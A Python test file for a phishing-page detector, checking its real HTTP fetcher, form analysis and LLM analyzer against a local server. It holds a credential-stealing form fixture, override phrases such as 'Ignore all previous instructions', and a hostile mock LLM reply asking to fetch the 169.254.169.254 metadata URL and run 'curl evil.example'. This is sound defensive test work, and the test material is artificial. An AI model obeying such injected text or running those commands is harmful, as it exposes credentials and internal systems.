"""Layer 4 end to end against a REAL local HTTP server.

Why this file exists: every other fetcher test injects a fake HTTP client, so
`_default_client()` - the real `requests.Session` with our cookie policy - was
never exercised. A bug in it (`'_BlockAllCookies' object has no attribute
'rfc2965'`) therefore passed 410 green tests and only surfaced against a live
site. These tests drive the real client against a loopback server, which keeps
them hermetic and fast while still covering the code path that broke.

The LLM is still injected: no test here needs an API key or a network LLM.
"""

from __future__ import annotations

import threading
from dataclasses import replace
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest

from conftest import FakeLLM, llm_response
from detector.config import DEFAULT_NETWORK_CONFIG
from detector.html_analyzer import analyze_html
from detector.llm_analyzer import analyze_page_content
from detector.web_fetcher import BlockAllCookiePolicy, _default_client, fetch_page

FIXTURES = Path(__file__).parent / "fixtures"

PAGE = b"""<html><head><title>Local Login</title></head>
<body><h1>Sign in</h1>
<form action="https://collector-site.ru/steal" method="post">
<input type="email" name="email"><input type="password" name="pw"></form>
</body></html>"""


class _Handler(BaseHTTPRequestHandler):
    """Serves a fixed page, sets a cookie, and records what it received."""

    received: list[tuple[str, dict]] = []

    def do_GET(self):
        type(self).received.append((self.path, dict(self.headers)))
        if self.path == "/redirect":
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()
            return
        if self.path == "/big":
            body = b"<html><body>" + b"A" * 300_000 + b"</body></html>"
        elif self.path == "/pdf":
            self.send_response(200)
            self.send_header("Content-Type", "application/pdf")
            self.send_header("Content-Length", "4")
            self.end_headers()
            self.wfile.write(b"%PDF")
            return
        else:
            body = PAGE
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        # A hostile page trying to set state on us.
        self.send_header("Set-Cookie", "sid=must-not-be-stored; Path=/")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):  # must never be reached - the fetcher is GET-only
        type(self).received.append(("POST " + self.path, dict(self.headers)))
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass


@pytest.fixture
def local_server():
    _Handler.received = []
    server = HTTPServer(("127.0.0.1", 0), _Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{server.server_address[1]}"
    server.shutdown()
    server.server_close()


@pytest.fixture
def loopback_config():
    """Permits loopback targets so the SSRF guard does not block the test server."""
    return replace(DEFAULT_NETWORK_CONFIG, allow_private_targets=True)


# ===========================================================================
# regression: the cookie policy that broke every live fetch
# ===========================================================================
def test_real_default_client_can_fetch(local_server, loopback_config):
    """Regression for: AttributeError '_BlockAllCookies' has no attribute 'rfc2965'.

    `http.cookiejar.CookieJar` reads policy *attributes* directly, not just the
    `*_ok` methods, so a partially duck-typed policy blew up inside
    `extract_cookies()` on the first response from a real server.
    """
    page = fetch_page(f"{local_server}/", loopback_config, client=_default_client())

    assert page.fetched is True, f"real client failed: {page.fetch_error}"
    assert page.fetch_error is None
    assert page.status_code == 200
    assert page.title == "Local Login"


def test_cookie_policy_implements_the_full_interface():
    """The attributes `CookieJar` reads directly must all be present."""
    policy = BlockAllCookiePolicy()
    for attribute in ("rfc2965", "hide_cookie2", "netscape",
                      "strict_ns_unverifiable", "strict_ns_domain",
                      "strict_ns_set_initial_dollar", "strict_ns_set_path"):
        assert hasattr(policy, attribute), f"missing policy attribute {attribute!r}"
    assert policy.set_ok(None, None) is False
    assert policy.return_ok(None, None) is False


def test_server_cookies_are_never_stored(local_server, loopback_config):
    client = _default_client()
    fetch_page(f"{local_server}/", loopback_config, client=client)
    fetch_page(f"{local_server}/", loopback_config, client=client)

    assert len(client.cookies) == 0
    # ...and none was ever sent back on the second request either.
    assert all("Cookie" not in headers for _path, headers in _Handler.received)


# ===========================================================================
# the safety contract, verified against a real server
# ===========================================================================
def test_only_get_is_issued(local_server, loopback_config):
    fetch_page(f"{local_server}/", loopback_config, client=_default_client())
    assert all(not path.startswith("POST") for path, _h in _Handler.received)


def test_redirects_are_followed_and_bounded(local_server, loopback_config):
    page = fetch_page(f"{local_server}/redirect", loopback_config,
                      client=_default_client())
    assert page.fetched is True
    assert page.redirect_chain == (f"{local_server}/",)


def test_oversized_response_is_capped(local_server, loopback_config):
    """Body over the cap but under the declared-size refusal threshold: it is
    read and truncated rather than rejected outright."""
    small = replace(loopback_config, max_response_bytes=100_000)
    page = fetch_page(f"{local_server}/big", small, client=_default_client())

    assert page.fetched is True
    assert page.truncated is True


def test_hugely_oversized_response_refused_before_reading(local_server,
                                                          loopback_config):
    tiny = replace(loopback_config, max_response_bytes=5_000)
    page = fetch_page(f"{local_server}/big", tiny, client=_default_client())

    assert page.fetched is False
    assert "response-too-large" in page.fetch_error


def test_non_html_content_type_refused(local_server, loopback_config):
    page = fetch_page(f"{local_server}/pdf", loopback_config, client=_default_client())
    assert page.fetched is False
    assert "content-type-not-analysable" in page.fetch_error


def test_ssrf_guard_still_blocks_loopback_by_default(local_server):
    """With the default config (allow_private_targets=False) the test server
    itself is refused - proving the guard is what let the other tests through."""
    page = fetch_page(f"{local_server}/", DEFAULT_NETWORK_CONFIG,
                      client=_default_client())
    assert page.fetched is False
    assert page.blocked_reason is not None
    assert _Handler.received == []          # nothing ever reached the server


# ===========================================================================
# the full Layer 4 chain, with only the LLM mocked
# ===========================================================================
def test_full_chain_fetch_to_structured_result(local_server, loopback_config):
    """URL -> fetch -> HTML extraction -> form analysis -> LLM -> structured result.

    Each stage is a separate component; only the LLM is substituted.
    """
    page = fetch_page(f"{local_server}/", loopback_config, client=_default_client())
    assert page.fetched is True                                   # stage 1: fetch

    structure = page.structure
    assert structure.title == "Local Login"                       # stage 2: HTML
    assert len(structure.forms) == 1

    form = structure.forms[0]                                     # stage 3: forms
    assert form.has_password_field is True
    assert form.posts_cross_domain is True
    assert structure.has_cross_domain_credential_post is True

    llm = FakeLLM(llm_response(                                   # stage 4: LLM
        brand_claimed="PayPal", brand_impersonation=True,
        credential_request=True, risk_level="high", confidence="high"))
    result = analyze_page_content(f"{local_server}/", page, llm_client=llm)

    assert result.performed is True                               # stage 5: result
    assert result.brand_impersonation is True
    assert result.llm_likelihood is not None
    assert len(llm.calls) == 1


# ===========================================================================
# prompt injection, from a real HTML fixture served over real HTTP
# ===========================================================================
def test_prompt_injection_fixture_is_treated_as_data():
    """The fixture page tries every trick: fake SYSTEM blocks, fence escapes,
    hidden tool-call directives. None of it may leave the fenced region."""
    html = (FIXTURES / "prompt_injection.html").read_text()
    url = "https://paypal-account-verify.com/signin"
    structure = analyze_html(url, html)

    llm = FakeLLM(llm_response(prompt_injection_attempt=True, risk_level="high",
                               confidence="high"))
    from detector.web_fetcher import PageContent
    page = PageContent(url=url, fetched=True, final_url=url, status_code=200,
                       structure=structure)
    result = analyze_page_content(url, page, llm_client=llm)

    system, prompt = llm.calls[0]

    # 1. Hostile text never reaches the system role.
    assert "Ignore all previous instructions" not in system
    assert "NEW INSTRUCTIONS" not in system

    # 2. It sits inside the fence in the user message.
    fence_start = prompt.index("BEGIN_UNTRUSTED_PAGE_DATA:")
    assert prompt.index("Ignore all previous instructions") > fence_start

    # 3. The page's own fence markers were neutralised, so it cannot forge an
    #    "end of untrusted data" boundary and append trailing instructions.
    assert prompt.count("BEGIN_UNTRUSTED_PAGE_DATA:") == 1
    assert prompt.count("END_UNTRUSTED_PAGE_DATA:") == 1
    assert "[fence-marker-removed]" in prompt

    # 4. The flag survives into the result.
    assert result.prompt_injection_attempt is True


def test_injection_fixture_static_facts_are_computed_independently():
    """The static analysis of the fixture cannot be talked out of by its text."""
    html = (FIXTURES / "prompt_injection.html").read_text()
    structure = analyze_html("https://paypal-account-verify.com/signin", html)

    assert structure.has_cross_domain_credential_post is True
    assert structure.has_otp_field is True
    assert "credential-collector.ru" in structure.cross_domain_form_targets
    assert structure.scripts.obfuscation_markers != ()
    assert "Hidden directive" in structure.hidden_text
    # The hidden tool-call directive is reported as page content, never acted on.
    assert "169.254.169.254" in structure.hidden_text


def test_injection_page_cannot_reach_the_fetcher_or_config():
    """Nothing the LLM returns is ever used as a command, URL or config change."""
    html = (FIXTURES / "prompt_injection.html").read_text()
    url = "https://paypal-account-verify.com/signin"
    from detector.web_fetcher import PageContent
    page = PageContent(url=url, fetched=True, final_url=url, status_code=200,
                       structure=analyze_html(url, html))

    # A maximally hostile (schema-violating) LLM response.
    llm = FakeLLM({
        "risk_level": "low", "confidence": "high",
        "fetch_url": "http://169.254.169.254/latest/meta-data/",
        "execute": "curl evil.example",
        "set_config": {"blocklist_domains": []},
        "submit_form": True,
    })
    result = analyze_page_content(url, page, llm_client=llm)

    d = result.as_dict()
    for forbidden in ("fetch_url", "execute", "set_config", "submit_form"):
        assert forbidden not in d
    assert any("unexpected field" in v for v in result.schema_violations)
    # Config is untouched.
    assert DEFAULT_NETWORK_CONFIG.allow_private_targets is False
